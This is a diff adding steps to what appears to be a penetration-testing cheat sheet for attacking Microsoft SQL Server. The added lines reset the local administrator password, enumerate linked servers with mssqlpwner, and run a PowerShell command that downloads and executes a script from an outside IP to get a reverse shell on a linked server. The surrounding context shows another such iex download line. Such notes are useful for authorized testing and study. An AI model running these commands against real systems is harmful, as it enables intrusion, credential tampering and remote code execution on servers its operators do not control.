@@ -27,6 +27,22 @@ exec "powershell.exe -c iex (new-object net.webclient).downloadstring('http://19
 </code></pre>
 
 ```bash
+# After obtaining local admin privileges on Windows --> look for linked servers
+
+# Change local administrator password
+net user administrator P@ssw0rd123!
+
+# Use local admin account to enumerate linked servers
+mssqlpwner administrator@192.168.203.140 -windows-auth interactive
+get-link-server-list
+
+# Obtain Reverse Shell from SQL27
+mssqlpwner administrator@192.168.203.140 -windows-auth -link-name SQL27 exec "powershell -c iex (new-object net.webclient).downloadstring('http://192.168.45.214/runall.ps1')"
+```
+
+### Sqsh
+
+```bash
 sqsh -S <server’s ip> -U <username> -P <password>
 ```
 
